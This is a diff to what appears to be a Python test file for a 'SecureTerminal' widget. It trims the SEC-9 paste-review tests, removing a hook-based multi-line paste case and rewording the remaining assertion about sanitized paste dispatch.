 eq(_hs.lineWrapMode(), _QPTE.LineWrapMode.WidgetWidth,
@@ -8646,27 +8227,18 @@ ok(_p37_has_bell('') is False, 'bell: empty string -> False')
 
 
 
-# --- security cycle: SEC-9 (multi-line paste bypass) + SEC-4 (interrupted CSI leak) ---
+# --- security cycle: SEC-9 (reviewed paste dispatch) + SEC-4 (interrupted CSI leak) ---
 _p9 = SecureTerminal(command='/bin/cat', tui=False)
 _p9.resize(400, 300); _p9.show(); APP.processEvents()
-_p9._hook = {'argv': ['/bin/true'], 'on_error': 'allow'}
 _p9.has_foreground_program = lambda: False
 _p9._bracketed_paste_active = lambda: False
-_p9_routed = []
-_p9._inject_text_reviewed = lambda t: _p9_routed.append(t)
-_p9._review_active = True
-_p9._pending_paste = 'echo one\necho two\necho three'
-_p9.dispatch_pending_paste('stripped')
-ok(_p9_routed == ['echo one\necho two\necho three'],
-   'SEC-9: a multi-line paste with a hook routes through the atomic batch review (not embedded-CR)')
-# else branch: no hook -> _dispatch_paste (embedded delivery, unchanged)
-_p9._hook = None
 _p9_disp = []
 _p9._dispatch_paste = lambda r, a: _p9_disp.append((r, a))
 _p9._review_active = True
 _p9._pending_paste = 'a\nb'
 _p9.dispatch_pending_paste('stripped')
-ok(_p9_disp == [('a\nb', 'stripped')], 'SEC-9: with no hook, the reviewed paste dispatches as before')
+ok(_p9_disp == [('a\nb', 'stripped')],
+   'SEC-9: a resolved paste review dispatches through the sanitizing paste path')
 # reject / no-op paths
 _p9._review_active = True
 _p9._pending_paste = 'x'
